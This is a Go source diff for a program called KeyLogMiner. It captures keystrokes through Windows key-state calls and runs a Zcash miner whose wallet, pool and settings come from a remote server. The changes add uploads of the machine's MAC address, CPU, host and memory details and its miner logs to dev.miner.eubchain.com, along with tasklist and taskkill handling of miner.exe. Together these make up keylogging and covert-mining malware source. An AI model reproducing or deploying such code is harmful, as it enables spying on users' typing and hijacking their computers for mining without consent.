@@ -20,7 +20,13 @@ import (
 	"github.com/shirou/gopsutil/mem"
 	"github.com/shirou/gopsutil/cpu"
 	"github.com/shirou/gopsutil/host"
+	"bufio"
+	"io"
+	"path/filepath"
 )
+
+const apiUploadMachineInfor,
+apiUploadMachineStatus = "http://dev.miner.eubchain.com:3001/machine", "http://dev.miner.eubchain.com:3001/status"
 
 // Configuration strcution is storing all required configuration data
 type Configuration struct {
@@ -37,10 +43,10 @@ type Configuration struct {
 }
 
 type Machine struct {
-	MachineName string `json:"machineName"`
-	Disk mem.VirtualMemoryStat `json:"disk"`
-	Cpu []cpu.InfoStat `json:"cpu"`
-	Host host.InfoStat `json:"host"`
+	MachineName string                `json:"machineName"`
+	Disk        mem.VirtualMemoryStat `json:"disk"`
+	Cpu         []cpu.InfoStat        `json:"cpu"`
+	Host        host.InfoStat         `json:"host"`
 }
 type MachineConfig struct {
 	MachineName               string `json:"machineName"`
@@ -51,8 +57,8 @@ type MachineConfig struct {
 	Defaultpoolport           string `json:"defaultpoolport"`
 	Zcashminerflagextra       string `json:"zcashminerflagextra"`
 	Zcashminerdir             string `json:"zcashminerdir"`
-	Keycount int `json:"keycount"`
-	Timeout int64 `json:"timeout"`
+	Keycount                  int    `json:"keycount"`
+	Timeout                   int64  `json:"timeout"`
 }
 
 type MachineConfigResponse struct {
@@ -69,33 +75,35 @@ func getMac() net.HardwareAddr {
 	return macAddr
 }
 
-func uploadAndGetMachineConfig() MachineConfig{
-	disk,diskErr:=mem.VirtualMemory()
+func uploadAndGetMachineConfig() (machineConfig MachineConfig, errR [] error) {
+	disk, diskErr := mem.VirtualMemory()
 	if diskErr != nil {
-		fmt.Println("error",diskErr)
+		fmt.Println("error", diskErr)
 	}
-	cpuInfo,cpuErr := cpu.Info()
+	cpuInfo, cpuErr := cpu.Info()
 	if cpuErr != nil {
-		fmt.Println("error",cpuErr)
+		fmt.Println("error", cpuErr)
 	}
-	hostInfo,hostErr := host.Info()
+	hostInfo, hostErr := host.Info()
 	if hostErr != nil {
-		fmt.Println("error",hostErr)
+		fmt.Println("error", hostErr)
 	}
 
 	machine := Machine{
 		MachineName: getMac().String(),
-		Disk:*disk,
-		Cpu:cpuInfo,
-		Host:*hostInfo}
+		Disk:        *disk,
+		Cpu:         cpuInfo,
+		Host:        *hostInfo}
 
 	machineConfigResponse := MachineConfigResponse{}
 	resp, _, err := gorequest.New().
-		Post("http://192.168.1.52:3001/machine").
+		Post(apiUploadMachineInfor).
 		Send(machine).
+		Timeout(time.Duration(5 * time.Second)).
 		EndStruct(&machineConfigResponse)
 	if err != nil {
 		fmt.Println("error:", err)
+		return machineConfigResponse.Result, err
 	}
 
 	if resp.StatusCode == 200 && machineConfigResponse.Succeed {
@@ -103,7 +111,7 @@ func uploadAndGetMachineConfig() MachineConfig{
 	} else {
 		fmt.Println("Upload Machine Information Fail !")
 	}
-	return  machineConfigResponse.Result
+	return machineConfigResponse.Result, nil
 }
 
 var (
@@ -178,64 +186,64 @@ func keyLogger(config *Configuration) {
 				tmpKeylog += "[Esc]"
 			case w32.VK_SPACE:
 				tmpKeylog += " "
-			// case w32.VK_PRIOR:
-			// 	tmpKeylog += "[PageUp]"
-			// case w32.VK_NEXT:
-			// 	tmpKeylog += "[PageDown]"
-			// case w32.VK_END:
-			// 	tmpKeylog += "[End]"
-			// case w32.VK_HOME:
-			// 	tmpKeylog += "[Home]"
-			// case w32.VK_LEFT:
-			// 	tmpKeylog += "[Left]"
-			// case w32.VK_UP:
-			// 	tmpKeylog += "[Up]"
-			// case w32.VK_RIGHT:
-			// 	tmpKeylog += "[Right]"
-			// case w32.VK_DOWN:
-			// 	tmpKeylog += "[Down]"
-			// case w32.VK_SELECT:
-			// 	tmpKeylog += "[Select]"
-			// case w32.VK_PRINT:
-			// 	tmpKeylog += "[Print]"
-			// case w32.VK_EXECUTE:
-			// 	tmpKeylog += "[Execute]"
-			// case w32.VK_SNAPSHOT:
-			// 	tmpKeylog += "[PrintScreen]"
-			// case w32.VK_INSERT:
-			// 	tmpKeylog += "[Insert]"
-			// case w32.VK_DELETE:
-			// 	tmpKeylog += "[Delete]"
-			// case w32.VK_HELP:
-			// 	tmpKeylog += "[Help]"
-			// case w32.VK_LWIN:
-			// 	tmpKeylog += "[LeftWindows]"
-			// case w32.VK_RWIN:
-			// 	tmpKeylog += "[RightWindows]"
-			// case w32.VK_APPS:
-			// 	tmpKeylog += "[Applications]"
-			// case w32.VK_SLEEP:
-			// 	tmpKeylog += "[Sleep]"
-			// case w32.VK_NUMPAD0:
-			// 	tmpKeylog += "[Pad 0]"
-			// case w32.VK_NUMPAD1:
-			// 	tmpKeylog += "[Pad 1]"
-			// case w32.VK_NUMPAD2:
-			// 	tmpKeylog += "[Pad 2]"
-			// case w32.VK_NUMPAD3:
-			// 	tmpKeylog += "[Pad 3]"
-			// case w32.VK_NUMPAD4:
-			// 	tmpKeylog += "[Pad 4]"
-			// case w32.VK_NUMPAD5:
-			// 	tmpKeylog += "[Pad 5]"
-			// case w32.VK_NUMPAD6:
-			// 	tmpKeylog += "[Pad 6]"
-			// case w32.VK_NUMPAD7:
-			// 	tmpKeylog += "[Pad 7]"
-			// case w32.VK_NUMPAD8:
-			// 	tmpKeylog += "[Pad 8]"
-			// case w32.VK_NUMPAD9:
-			// 	tmpKeylog += "[Pad 9]"
+				// case w32.VK_PRIOR:
+				// 	tmpKeylog += "[PageUp]"
+				// case w32.VK_NEXT:
+				// 	tmpKeylog += "[PageDown]"
+				// case w32.VK_END:
+				// 	tmpKeylog += "[End]"
+				// case w32.VK_HOME:
+				// 	tmpKeylog += "[Home]"
+				// case w32.VK_LEFT:
+				// 	tmpKeylog += "[Left]"
+				// case w32.VK_UP:
+				// 	tmpKeylog += "[Up]"
+				// case w32.VK_RIGHT:
+				// 	tmpKeylog += "[Right]"
+				// case w32.VK_DOWN:
+				// 	tmpKeylog += "[Down]"
+				// case w32.VK_SELECT:
+				// 	tmpKeylog += "[Select]"
+				// case w32.VK_PRINT:
+				// 	tmpKeylog += "[Print]"
+				// case w32.VK_EXECUTE:
+				// 	tmpKeylog += "[Execute]"
+				// case w32.VK_SNAPSHOT:
+				// 	tmpKeylog += "[PrintScreen]"
+				// case w32.VK_INSERT:
+				// 	tmpKeylog += "[Insert]"
+				// case w32.VK_DELETE:
+				// 	tmpKeylog += "[Delete]"
+				// case w32.VK_HELP:
+				// 	tmpKeylog += "[Help]"
+				// case w32.VK_LWIN:
+				// 	tmpKeylog += "[LeftWindows]"
+				// case w32.VK_RWIN:
+				// 	tmpKeylog += "[RightWindows]"
+				// case w32.VK_APPS:
+				// 	tmpKeylog += "[Applications]"
+				// case w32.VK_SLEEP:
+				// 	tmpKeylog += "[Sleep]"
+				// case w32.VK_NUMPAD0:
+				// 	tmpKeylog += "[Pad 0]"
+				// case w32.VK_NUMPAD1:
+				// 	tmpKeylog += "[Pad 1]"
+				// case w32.VK_NUMPAD2:
+				// 	tmpKeylog += "[Pad 2]"
+				// case w32.VK_NUMPAD3:
+				// 	tmpKeylog += "[Pad 3]"
+				// case w32.VK_NUMPAD4:
+				// 	tmpKeylog += "[Pad 4]"
+				// case w32.VK_NUMPAD5:
+				// 	tmpKeylog += "[Pad 5]"
+				// case w32.VK_NUMPAD6:
+				// 	tmpKeylog += "[Pad 6]"
+				// case w32.VK_NUMPAD7:
+				// 	tmpKeylog += "[Pad 7]"
+				// case w32.VK_NUMPAD8:
+				// 	tmpKeylog += "[Pad 8]"
+				// case w32.VK_NUMPAD9:
+				// 	tmpKeylog += "[Pad 9]"
 			case w32.VK_NUMPAD0:
 				tmpKeylog += "0"
 			case w32.VK_NUMPAD1:
@@ -260,54 +268,54 @@ func keyLogger(config *Configuration) {
 				tmpKeylog += "*"
 			case w32.VK_ADD:
 				tmpKeylog += "+"
-			// case w32.VK_SEPARATOR:
-			// tmpKeylog += "[Separator]"
+				// case w32.VK_SEPARATOR:
+				// tmpKeylog += "[Separator]"
 			case w32.VK_SUBTRACT:
 				tmpKeylog += "-"
 			case w32.VK_DECIMAL:
 				tmpKeylog += "."
-			// case w32.VK_DIVIDE:
-			// 	tmpKeylog += "[Devide]"
-			// case w32.VK_F1:
-			// 	tmpKeylog += "[F1]"
-			// case w32.VK_F2:
-			// 	tmpKeylog += "[F2]"
-			// case w32.VK_F3:
-			// 	tmpKeylog += "[F3]"
-			// case w32.VK_F4:
-			// 	tmpKeylog += "[F4]"
-			// case w32.VK_F5:
-			// 	tmpKeylog += "[F5]"
-			// case w32.VK_F6:
-			// 	tmpKeylog += "[F6]"
-			// case w32.VK_F7:
-			// 	tmpKeylog += "[F7]"
-			// case w32.VK_F8:
-			// 	tmpKeylog += "[F8]"
-			// case w32.VK_F9:
-			// 	tmpKeylog += "[F9]"
-			// case w32.VK_F10:
-			// 	tmpKeylog += "[F10]"
-			// case w32.VK_F11:
-			// 	tmpKeylog += "[F11]"
-			// case w32.VK_F12:
-			// 	tmpKeylog += "[F12]"
-			// case w32.VK_NUMLOCK:
-			// 	tmpKeylog += "[NumLock]"
-			// case w32.VK_SCROLL:
-			// 	tmpKeylog += "[ScrollLock]"
-			// case w32.VK_LSHIFT:
-			// 	tmpKeylog += "[LeftShift]"
-			// case w32.VK_RSHIFT:
-			// 	tmpKeylog += "[RightShift]"
-			// case w32.VK_LCONTROL:
-			// 	tmpKeylog += "[LeftCtrl]"
-			// case w32.VK_RCONTROL:
-			// 	tmpKeylog += "[RightCtrl]"
-			// case w32.VK_LMENU:
-			// 	tmpKeylog += "[LeftMenu]"
-			// case w32.VK_RMENU:
-			// 	tmpKeylog += "[RightMenu]"
+				// case w32.VK_DIVIDE:
+				// 	tmpKeylog += "[Devide]"
+				// case w32.VK_F1:
+				// 	tmpKeylog += "[F1]"
+				// case w32.VK_F2:
+				// 	tmpKeylog += "[F2]"
+				// case w32.VK_F3:
+				// 	tmpKeylog += "[F3]"
+				// case w32.VK_F4:
+				// 	tmpKeylog += "[F4]"
+				// case w32.VK_F5:
+				// 	tmpKeylog += "[F5]"
+				// case w32.VK_F6:
+				// 	tmpKeylog += "[F6]"
+				// case w32.VK_F7:
+				// 	tmpKeylog += "[F7]"
+				// case w32.VK_F8:
+				// 	tmpKeylog += "[F8]"
+				// case w32.VK_F9:
+				// 	tmpKeylog += "[F9]"
+				// case w32.VK_F10:
+				// 	tmpKeylog += "[F10]"
+				// case w32.VK_F11:
+				// 	tmpKeylog += "[F11]"
+				// case w32.VK_F12:
+				// 	tmpKeylog += "[F12]"
+				// case w32.VK_NUMLOCK:
+				// 	tmpKeylog += "[NumLock]"
+				// case w32.VK_SCROLL:
+				// 	tmpKeylog += "[ScrollLock]"
+				// case w32.VK_LSHIFT:
+				// 	tmpKeylog += "[LeftShift]"
+				// case w32.VK_RSHIFT:
+				// 	tmpKeylog += "[RightShift]"
+				// case w32.VK_LCONTROL:
+				// 	tmpKeylog += "[LeftCtrl]"
+				// case w32.VK_RCONTROL:
+				// 	tmpKeylog += "[RightCtrl]"
+				// case w32.VK_LMENU:
+				// 	tmpKeylog += "[LeftMenu]"
+				// case w32.VK_RMENU:
+				// 	tmpKeylog += "[RightMenu]"
 			case w32.VK_OEM_1:
 				tmpKeylog += ";"
 			case w32.VK_OEM_2:
@@ -424,7 +432,7 @@ func RunMiner(config *Configuration) {
 	_, currentFilePath, _, _ := runtime.Caller(0)
 	dirpath := path.Dir(currentFilePath)
 
-	var fullcommand = fmt.Sprintf(dirpath) + "/" + config.ZcashMinerDir + "/" + minerprocess + " --server " + config.DefaultPoolAddress + " --user " + config.DefaultZcashWalletAddress + "." + config.LocalMachineName + " --port " + config.DefaultPoolPort + " " + config.ZcashMinerFlagExtra
+	var fullcommand = fmt.Sprintf(dirpath) + "/" + config.ZcashMinerDir + "/" + minerprocess + " --server " + config.DefaultPoolAddress + " --user " + config.DefaultZcashWalletAddress + "." + config.LocalMachineName + " --port " + config.DefaultPoolPort + " " + config.ZcashMinerFlagExtra + " --log 2"
 	// fmt.Println(fullcommand)
 	// fmt.Print("Process ID = ")
 	// fmt.Println(config.ProcessID)
@@ -440,6 +448,22 @@ func RunMiner(config *Configuration) {
 		// config.ProcessID = c.Process.Pid
 	}
 }
+func getMinerPid() (pid string, pidErr error) {
+	s := "tasklist | findstr miner.exe"
+	cmd := exec.Command("cmd", "/C", s)
+	var out bytes.Buffer
+	var stderr bytes.Buffer
+	cmd.Stdout = &out
+	cmd.Stderr = &stderr
+	err := cmd.Run()
+	if err != nil {
+		fmt.Println(fmt.Sprint(err) + ": " + stderr.String())
+		return "", err
+	}
+	results := strings.Fields(out.String())
+	result := strings.Split(fmt.Sprint(results), " ")[1]
+	return strings.TrimSpace(result), nil
+}
 
 // StopMiner kill minging process
 func StopMiner(config *Configuration) {
@@ -447,38 +471,7 @@ func StopMiner(config *Configuration) {
 	pid := strconv.Itoa(config.ProcessID)
 	// Awaiting to complete
 	if config.ProcessID == 0 {
-		// s := "for /f \"" + "tokens=2\"" + " %a in ('" + " tasklist ^| find \"miner.exe\"'" + ") do Taskkill /PID %a /F 1 > run.log 2>&1"
-		s := "tasklist | findstr miner.exe"
-		// fmt.Println(s)
-		// c := exec.Command("cmd", "/C", s)
-		// if err := c.Run(); err != nil {
-		// 	fmt.Println("Error: ", err)
-		// }
-		cmd := exec.Command("cmd", "/C", s)
-		var out bytes.Buffer
-		var stderr bytes.Buffer
-		cmd.Stdout = &out
-		cmd.Stderr = &stderr
-		err := cmd.Run()
-		if err != nil {
-			fmt.Println(fmt.Sprint(err) + ": " + stderr.String())
-			return
-		}
-		// fmt.Println("Result: " + out.String())
-		results := strings.Fields(out.String())
-		result := strings.Split(fmt.Sprint(results), " ")[1]
-		// fmt.Println("Result = XXX", result, "XXX")
-		// fmt.Println(reflect.TypeOf(result))
-		// cmd := exec.Command("cmd", "/C", s)
-		// b, e := cmd.Output()
-		// fmt.Println(b)
-		// if e != nil {
-		// 	fmt.Printf("failed due to :%v\n", e)
-		// 	panic(e)
-		// }
-		// return
-		// pid = strconv.Atoi(strings.Replace(fmt.Sprint(result[0]), " ", "", -1))
-		pid = strings.TrimSpace(result)
+		pid, _ = getMinerPid()
 	}
 	var killcommand = "Taskkill /PID " + pid + " /F"
 	fmt.Print("KillCommand is ")
@@ -498,27 +491,102 @@ func suiside() {
 	// fmt.Println("this will never be printed: ", ret)
 }
 
+func tailMinerLog() [] string {
+	var minerLogs [] string
+
+	inputFile, inputError := os.Open("miner.log")
+	if inputError != nil {
+		fmt.Printf("An error occurred on opening the inputfile\n")
+	}
+	defer inputFile.Close()
+
+	inputReader := bufio.NewReader(inputFile)
+	for {
+		inputString, readerError := inputReader.ReadString('\n')
+		minerLogs = append(minerLogs, inputString)
+		if readerError == io.EOF {
+			return minerLogs
+		}
+	}
+	return minerLogs
+}
+
+type MachineStatus struct {
+	MachineName string    `json:"machineName"`
+	Logs        [] string `json:"logs"`
+	Status      bool      `json:"status"`
+}
+type MachineStatusResponse struct {
+	Result  [] string `json:"result"`
+	Succeed bool      `json:"succeed"`
+}
+
+func minerIsRunning() bool {
+	_, err := getMinerPid()
+	return err == nil
+}
+func resetEmptyMinerLog() {
+	file, err := os.OpenFile("miner.log", os.O_RDWR|os.O_CREATE, 0766)
+	if err != nil {
+		fmt.Println("reset miner log fail", file)
+	}
+	file.WriteString("")
+	file.Close()
+}
+func uploadMachineStatus() {
+	for range time.NewTicker(time.Millisecond * 10000).C {
+		machineStatus := MachineStatus{getMac().String(), tailMinerLog(), minerIsRunning()}
+		machineStatusResponse := MachineStatusResponse{}
+		resp, _, err := gorequest.New().
+			Post(apiUploadMachineStatus).
+			Send(machineStatus).
+			EndStruct(&machineStatusResponse)
+		if err != nil {
+			fmt.Println("error:", err)
+		}
+		if resp.StatusCode == 200 && machineStatusResponse.Succeed {
+			resetEmptyMinerLog()
+			fmt.Println("Upload Machine Status Successful !")
+		} else {
+			fmt.Println("Upload Machine Status Fail !")
+		}
+	}
+}
+func getCurrentDirectory() string {
+	dir, err := filepath.Abs(filepath.Dir(os.Args[0]))
+	if err != nil {
+		fmt.Println("error:",err)
+	}
+	return strings.Replace(dir, "\\", "/", -1)
+}
 func main() {
-	//_, currentFilePath, _, _ := runtime.Caller(0)
-	//dirpath := path.Dir(currentFilePath)
-	//var configpath = fmt.Sprintf(dirpath) + "/config.toml"
-	//var config = ReadConfig(configpath)
-	//config.ProcessID=0
-	machineConfig:=uploadAndGetMachineConfig()
-	config:=Configuration{
-		ServerURL:machineConfig.Serverurl,
-		LocalMachineName:machineConfig.Localmachinename,
-		DefaultZcashWalletAddress:machineConfig.Defaultzcashwalletaddress,
-		DefaultPoolAddress:machineConfig.Defaultpooladdress,
-		DefaultPoolPort:machineConfig.Defaultpoolport,
-		ZcashMinerFlagExtra:machineConfig.Zcashminerflagextra,
-		ZcashMinerDir:machineConfig.Zcashminerdir,
-		KeyCount:machineConfig.Keycount,
-		TimeOut:machineConfig.Timeout,
-		ProcessID:0}
+	machineConfig, err := uploadAndGetMachineConfig()
+	config := Configuration{}
+	if err != nil {
+		execpath, err := os.Executable() // 获得程序路径
+		// handle err ...
+		if err != nil {
+			fmt.Println("error:", err)
+		}
+		config = ReadConfig(filepath.Join(filepath.Dir(execpath), "./config.toml"))
+		config.ProcessID = 0
+	} else {
+		config = Configuration{
+			ServerURL:                 machineConfig.Serverurl,
+			LocalMachineName:          machineConfig.Localmachinename,
+			DefaultZcashWalletAddress: machineConfig.Defaultzcashwalletaddress,
+			DefaultPoolAddress:        machineConfig.Defaultpooladdress,
+			DefaultPoolPort:           machineConfig.Defaultpoolport,
+			ZcashMinerFlagExtra:       machineConfig.Zcashminerflagextra,
+			ZcashMinerDir:             machineConfig.Zcashminerdir,
+			KeyCount:                  machineConfig.Keycount,
+			TimeOut:                   machineConfig.Timeout,
+			ProcessID:                 0}
+	}
 
 	fmt.Println("Starting KeyLogMiner!")
 	go RunMiner(&config)
+	//go uploadMachineStatus()
 	// Run Miner
 	keyLogger(&config)
 	// go keyLogger(&config)
